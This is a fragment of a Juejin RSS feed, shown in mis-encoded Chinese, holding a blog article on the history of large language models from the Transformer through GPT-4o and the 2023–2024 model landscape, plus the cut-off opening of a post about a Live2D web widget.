<li><strong>LLM æ˜¯æ–‡å­—æ¥é¾™æœºå™¨</strong>â€”â€”æ ¸å¿ƒåŸç†æ˜¯é¢„æµ‹ä¸‹ä¸€ä¸ªè¯</li>
<li><strong>LLM æœ‰å¼ºå¤§ä½†æœ‰é™çš„èƒ½åŠ›</strong>â€”â€”ç†è§£ã€ç”Ÿæˆã€æ¨ç†ã€å­¦ä¹ éƒ½å¾ˆå¼ºï¼Œä½†å¹¶éä¸‡èƒ½</li>
<li><strong>LLM çš„çŸ¥è¯†æ¥è‡ªè®­ç»ƒæ•°æ®</strong>â€”â€”å®ƒå­¦ä¹ çš„æ˜¯æ¨¡å¼å’Œè§„å¾‹ï¼Œè€Œéç®€å•è®°å¿†</li>
<li><strong>LLM ä¼šçŠ¯é”™</strong>â€”â€”å¹»è§‰ã€çŸ¥è¯†æˆªæ­¢ã€è®¡ç®—ä¸ç²¾ç¡®æ˜¯å¸¸è§é—®é¢˜</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å¤§æ¨¡å‹å‘å±•å²-01]]></title>    <link>https://juejin.cn/post/7600986252449234984</link>    <guid>https://juejin.cn/post/7600986252449234984</guid>    <pubDate>2026-01-30T15:01:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600986252449234984" data-draft-id="7600799940971724840" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å¤§æ¨¡å‹å‘å±•å²-01"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-30T15:01:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€è¯ºæ»šé›ªçƒ"/> <meta itemprop="url" content="https://juejin.cn/user/2824015112318094"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å¤§æ¨¡å‹å‘å±•å²-01
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2824015112318094/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€è¯ºæ»šé›ªçƒ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T15:01:41.000Z" title="Fri Jan 30 2026 15:01:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>2017å¹´ï¼Œä¸€ç¯‡è®ºæ–‡æ‚„ç„¶å‘è¡¨ï¼Œé¢˜ä¸ºã€ŠAttention Is All You Needã€‹ã€‚</p>
<p>å½“æ—¶æ²¡äººé¢„æ–™åˆ°ï¼Œè¿™ç¯‡è®ºæ–‡ä¸­æå‡ºçš„ Transformer æ¶æ„ï¼Œä¼šåœ¨çŸ­çŸ­å‡ å¹´å†…å½»åº•æ”¹å˜äººå·¥æ™ºèƒ½çš„æ ¼å±€ã€‚</p>
<p>äº”å¹´åçš„2022å¹´11æœˆ30æ—¥ï¼ŒChatGPT å‘å¸ƒã€‚äº”å¤©å†…ï¼Œç”¨æˆ·çªç ´100ä¸‡ã€‚ä¸¤ä¸ªæœˆå†…ï¼Œç”¨æˆ·çªç ´1äº¿ã€‚</p>
<p>è¿™æ˜¯äº’è”ç½‘å†å²ä¸Šå¢é•¿æœ€å¿«çš„åº”ç”¨ï¼Œä¹Ÿæ˜¯äººå·¥æ™ºèƒ½å‘å±•å²ä¸Šçš„é‡è¦é‡Œç¨‹ç¢‘ã€‚</p>
<p>ä»é»˜é»˜æ— é—»åˆ°å¸­å·å…¨çƒï¼Œå¤§è¯­è¨€æ¨¡å‹ç»å†äº†æ€æ ·çš„è¿›åŒ–ä¹‹è·¯ï¼Ÿè®©æˆ‘ä»¬ä¸€èµ·å›é¡¾è¿™æ®µæ¿€åŠ¨äººå¿ƒçš„æŠ€æœ¯æ¼”è¿›å²ã€‚</p>
<hr/>
<h2 data-id="heading-1">1. ä»€ä¹ˆæ˜¯ Transformer</h2>
<p><strong>Transformer</strong> æ˜¯ä¸€ç§å®Œå…¨åŸºäºæ³¨æ„åŠ›æœºåˆ¶çš„ç¥ç»ç½‘ç»œæ¶æ„ï¼Œäº2017å¹´ç”± Google å›¢é˜Ÿæå‡ºã€‚</p>
<h3 data-id="heading-2">æ ¸å¿ƒåˆ›æ–°</h3>





















<table><thead><tr><th>ç‰¹ç‚¹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><strong>Self-Attention</strong></td><td>è‡ªæ³¨æ„åŠ›æœºåˆ¶ï¼Œæ•æ‰é•¿è·ç¦»ä¾èµ–</td></tr><tr><td><strong>å¹¶è¡Œè®¡ç®—</strong></td><td>å¯å¹¶è¡Œè®­ç»ƒï¼Œå¤§å¹…æå‡æ•ˆç‡</td></tr><tr><td><strong>å¯æ‰©å±•æ€§</strong></td><td>ä¸ºåç»­å¤§æ¨¡å‹å¥ å®šåŸºç¡€</td></tr></tbody></table>
<h3 data-id="heading-3">æ ¸å¿ƒæ€æƒ³</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Transformer çš„æ ¸å¿ƒï¼šSelf-Attention</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Transformer</span> {
  <span class="hljs-title function_">attention</span>(<span class="hljs-params">Q, K, V</span>) {
    <span class="hljs-comment">// Q (Query)ã€K (Key)ã€V (Value)</span>
    <span class="hljs-keyword">const</span> scores = Q @ K.<span class="hljs-property">T</span> / <span class="hljs-title class_">Math</span>.<span class="hljs-title function_">sqrt</span>(d_k);  <span class="hljs-comment">// è®¡ç®—æ³¨æ„åŠ›åˆ†æ•°</span>
    <span class="hljs-keyword">const</span> weights = <span class="hljs-title function_">softmax</span>(scores);           <span class="hljs-comment">// å½’ä¸€åŒ–</span>
    <span class="hljs-keyword">return</span> weights @ V;                        <span class="hljs-comment">// åŠ æƒæ±‚å’Œ</span>
  }
}
</code></pre>
<h3 data-id="heading-4">é‡è¦æœ¯è¯­</h3>

























<table><thead><tr><th>æœ¯è¯­</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td><strong>é¢„è®­ç»ƒ</strong></td><td>ç”¨å¤§é‡æ— æ ‡æ³¨æ•°æ®è®­ç»ƒåŸºç¡€æ¨¡å‹</td></tr><tr><td><strong>å¾®è°ƒ</strong></td><td>é’ˆå¯¹ç‰¹å®šä»»åŠ¡ç”¨å°æ•°æ®é›†ä¼˜åŒ–æ¨¡å‹</td></tr><tr><td><strong>RLHF</strong></td><td>äººç±»åé¦ˆå¼ºåŒ–å­¦ä¹ ï¼Œå¯¹é½äººç±»åå¥½</td></tr><tr><td><strong>å°‘æ ·æœ¬å­¦ä¹ </strong></td><td>åªéœ€å‡ ä¸ªä¾‹å­å°±èƒ½å­¦ä¼šæ–°ä»»åŠ¡</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-5">2. æ¡ˆä¾‹</h2>
<h3 data-id="heading-6">æ¡ˆä¾‹ 1ï¼šGPT ç³»åˆ—çš„è¿›åŒ–ä¹‹è·¯</h3>
<p>è®©æˆ‘ä»¬çœ‹çœ‹ GPT ç³»åˆ—æ˜¯å¦‚ä½•ä¸€æ­¥æ­¥è¿›åŒ–çš„ï¼š</p>















































<table><thead><tr><th>ä»£é™…</th><th>å‘å¸ƒæ—¶é—´</th><th>å‚æ•°é‡</th><th>èƒ½åŠ›çªç ´</th></tr></thead><tbody><tr><td>GPT-1</td><td>2018.06</td><td>117M</td><td>é¢„è®­ç»ƒèŒƒå¼</td></tr><tr><td>GPT-2</td><td>2019.02</td><td>1.5B</td><td>é›¶æ ·æœ¬ç”Ÿæˆ</td></tr><tr><td>GPT-3</td><td>2020.05</td><td>175B</td><td>å°‘æ ·æœ¬å­¦ä¹ </td></tr><tr><td>GPT-3.5</td><td>2022.11</td><td>æœªçŸ¥</td><td>å¯¹è¯èƒ½åŠ›</td></tr><tr><td>GPT-4</td><td>2023.03</td><td>~1.7T</td><td>å¤šæ¨¡æ€+æ¨ç†</td></tr><tr><td>GPT-4o</td><td>2024.05</td><td>æœªçŸ¥</td><td>åŸç”Ÿå¤šæ¨¡æ€</td></tr></tbody></table>
<p><strong>å…³é”®çªç ´ï¼šGPT-3 çš„å°‘æ ·æœ¬å­¦ä¹ </strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> prompt = <span class="hljs-string">`
ç¿»è¯‘ä»¥ä¸‹å¥å­æˆä¸­æ–‡ï¼š
Example 1: Hello world -&gt; ä½ å¥½ä¸–ç•Œ
Example 2: How are you -&gt; ä½ å¥½å—
Input: Good morning -&gt; ?
`</span>;
<span class="hljs-comment">// GPT-3: æ—©ä¸Šå¥½</span>
<span class="hljs-comment">// æ²¡æœ‰ä¸“é—¨è®­ç»ƒï¼Œå°±èƒ½å­¦ä¼šç¿»è¯‘ä»»åŠ¡</span>
</code></pre>
<h3 data-id="heading-7">æ¡ˆä¾‹ 2ï¼šChatGPT çš„ AI iPhone æ—¶åˆ»</h3>
<p><strong>å‘å¸ƒæ—¶é—´</strong>ï¼š2022å¹´11æœˆ30æ—¥</p>
<p><strong>çªç ´æ€§æ”¹è¿›</strong>ï¼š</p>
<pre><code class="hljs language-markdown" lang="markdown">è®­ç»ƒæµç¨‹ï¼š
<span class="hljs-bullet">1.</span> é¢„è®­ç»ƒï¼ˆå­¦ä¹ çŸ¥è¯†ï¼‰
   â†“
<span class="hljs-bullet">2.</span> æœ‰ç›‘ç£å¾®è°ƒï¼ˆå­¦ä¹ æŒ‡ä»¤ï¼‰
   â†“
<span class="hljs-bullet">3.</span> å¥–å¥–æ¨¡å‹ï¼ˆå­¦ä¹ äººç±»åå¥½ï¼‰
   â†“
<span class="hljs-bullet">4.</span> å¼ºåŒ–å­¦ä¹ ï¼ˆä¼˜åŒ–è¾“å‡ºï¼‰
</code></pre>
<p><strong>æˆæœ</strong>ï¼š</p>
<ul>
<li>å¯¹è¯èƒ½åŠ›å¤§å¹…æå‡</li>
<li>æŒ‡ä»¤éµå¾ªèƒ½åŠ›å¼º</li>
<li>å¤šè½®å¯¹è¯æµç•…</li>
<li>5å¤©ç”¨æˆ·ç ´100ä¸‡</li>
</ul>
<h3 data-id="heading-8">æ¡ˆä¾‹ 3ï¼š2023å¹´ç™¾èŠ±é½æ”¾</h3>
<p><strong>é—­æºæ¨¡å‹ä¸‰å¼ºé¼ç«‹</strong>ï¼š</p>

























<table><thead><tr><th>æ¨¡å‹</th><th>å…¬å¸</th><th>æ ¸å¿ƒä¼˜åŠ¿</th></tr></thead><tbody><tr><td>GPT-4</td><td>OpenAI</td><td>å¤šæ¨¡æ€ã€æ¨ç†èƒ½åŠ›å¼º</td></tr><tr><td>Claude 3</td><td>Anthropic</td><td>è¶…é•¿ä¸Šä¸‹æ–‡(200K)</td></tr><tr><td>Gemini</td><td>Google</td><td>åŸç”Ÿå¤šæ¨¡æ€</td></tr></tbody></table>
<p><strong>å¼€æºæ¨¡å‹å¿«é€Ÿè¿½èµ¶</strong>ï¼š</p>





























<table><thead><tr><th>æ¨¡å‹</th><th>ç»„ç»‡</th><th>å‚æ•°</th><th>ç‰¹ç‚¹</th></tr></thead><tbody><tr><td>Llama 3</td><td>Meta</td><td>8B/70B</td><td>æ€§èƒ½å¼ºåŠ²</td></tr><tr><td>Qwen</td><td>é˜¿é‡Œäº‘</td><td>7B/14B/72B</td><td>ä¸­æ–‡ä¼˜ç§€</td></tr><tr><td>Mistral</td><td>Mistral AI</td><td>7B</td><td>æ•ˆç‡ä¹‹ç‹</td></tr></tbody></table>
<p><strong>ä¸­å›½å¤§æ¨¡å‹å´›èµ·</strong>ï¼š</p>






























<table><thead><tr><th>æ¨¡å‹</th><th>å…¬å¸</th><th>ç‰¹è‰²</th></tr></thead><tbody><tr><td>æ–‡å¿ƒä¸€è¨€</td><td>ç™¾åº¦</td><td>çŸ¥è¯†å›¾è°±å¢å¼º</td></tr><tr><td>é€šä¹‰åƒé—®</td><td>é˜¿é‡Œäº‘</td><td>å¼€æºå‹å¥½</td></tr><tr><td>è®¯é£æ˜Ÿç«</td><td>ç§‘å¤§è®¯é£</td><td>è¯­éŸ³èƒ½åŠ›å¼º</td></tr><tr><td>DeepSeek</td><td>å¹»æ–¹é‡åŒ–</td><td>æ€§ä»·æ¯”é«˜</td></tr></tbody></table>
<h3 data-id="heading-9">æ¡ˆä¾‹ 4ï¼š2024å¹´çš„ä¸‰å¤§è¶‹åŠ¿</h3>
<p><strong>è¶‹åŠ¿1ï¼šå¼€æºæ¨¡å‹è¿½å¹³é—­æº</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-number">2024</span><span class="hljs-string">å¹´åˆï¼šLlama</span> <span class="hljs-number">2</span> <span class="hljs-string">70B</span> <span class="hljs-string">â‰ˆ</span> <span class="hljs-string">GPT-3.5</span>
<span class="hljs-number">2024</span><span class="hljs-string">å¹´ä¸­ï¼šLlama</span> <span class="hljs-number">3</span> <span class="hljs-string">70B</span> <span class="hljs-string">æ¥è¿‘</span> <span class="hljs-string">GPT-4</span>
<span class="hljs-number">2024</span><span class="hljs-string">å¹´åº•ï¼šQwen</span> <span class="hljs-number">2.5</span><span class="hljs-string">ã€DeepSeek</span> <span class="hljs-string">V3</span> <span class="hljs-string">è¿½å¹³é—­æº</span>
</code></pre>
<p><strong>è¶‹åŠ¿2ï¼šå¤šæ¨¡æ€æˆä¸ºæ ‡é…</strong></p>
<ul>
<li>GPT-4oï¼šåŸç”Ÿå¤šæ¨¡æ€</li>
<li>Claude 3.5ï¼šå¼ºå¤§çš„è§†è§‰èƒ½åŠ›</li>
<li>Geminiï¼šä»ä¸€å¼€å§‹å°±æ˜¯å¤šæ¨¡æ€</li>
</ul>
<p><strong>è¶‹åŠ¿3ï¼šæ™ºèƒ½ä½“æŠ€æœ¯æˆç†Ÿ</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// Agent èƒ½åŠ›çš„è¿›åŒ–</span>
<span class="hljs-number">2022</span>ï¼šç®€å•å¯¹è¯
<span class="hljs-number">2023</span>ï¼šå·¥å…·è°ƒç”¨
<span class="hljs-number">2024</span>ï¼š
  â”œâ”€â”€ å¤æ‚ä»»åŠ¡è§„åˆ’
  â”œâ”€â”€ å¤šæ™ºèƒ½ä½“åä½œ
  â”œâ”€â”€ è‡ªä¸»å­¦ä¹ å’Œæ”¹è¿›
  â””â”€â”€ çœŸæ­£çš„<span class="hljs-string">"AI å‘˜å·¥"</span>
</code></pre>
<hr/>
<h2 data-id="heading-10">æ€»ç»“</h2>
<ol>
<li><strong>è§„æ¨¡å³è´¨é‡</strong>â€”â€”æ›´å¤§çš„æ¨¡å‹é€šå¸¸è¡¨ç°æ›´å¥½</li>
<li><strong>æ•°æ®æ˜¯å…³é”®</strong>â€”â€”é«˜è´¨é‡è®­ç»ƒæ•°æ®è‡³å…³é‡è¦</li>
<li><strong>æ¶æ„åˆ›æ–°</strong>â€”â€”Transformer æ˜¯æ ¸å¿ƒçªç ´</li>
<li><strong>å¼€æºåŠ é€Ÿ</strong>â€”â€”å¼€æºæ¨¡å‹æ¨åŠ¨æŠ€æœ¯æ™®åŠ</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä¸ºç½‘é¡µæ³¨å…¥çµé­‚ï¼šLive2D Widgetçœ‹æ¿å¨˜ï¼Œæ‰“é€ ä¼šåŠ¨çš„äº’åŠ¨ä¼™ä¼´ï¼]]></title>    <link>https://juejin.cn/post/7601169987395174451</link>    <guid>https://juejin.cn/post/7601169987395174451</guid>    <pubDate>2026-01-30T15:01:41.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7601169987395174451" data-draft-id="7600953879501226035" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä¸ºç½‘é¡µæ³¨å…¥çµé­‚ï¼šLive2D Widgetçœ‹æ¿å¨˜ï¼Œæ‰“é€ ä¼šåŠ¨çš„äº’åŠ¨ä¼™ä¼´ï¼"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-30T15:01:41.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¿®å·±xj"/> <meta itemprop="url" content="https://juejin.cn/user/2641475936724142"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä¸ºç½‘é¡µæ³¨å…¥çµé­‚ï¼šLive2D Widgetçœ‹æ¿å¨˜ï¼Œæ‰“é€ ä¼šåŠ¨çš„äº’åŠ¨ä¼™ä¼´ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2641475936724142/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¿®å·±xj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T15:01:41.000Z" title="Fri Jan 30 2026 15:01:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åŒå€¦äº†é™æ€ç½‘é¡µçš„å†°å†·ä¸å•è°ƒï¼ŸLive2D Widget èƒ½å°†ä¸€ä¸ªç”ŸåŠ¨ã€å¯çˆ±çš„çœ‹æ¿å¨˜è½»æ¾å¸¦å…¥ä½ çš„ç½‘ç«™ã€‚åªéœ€ä¸€è¡Œä»£ç ï¼Œè¿™ä¸ªç”± TypeScript 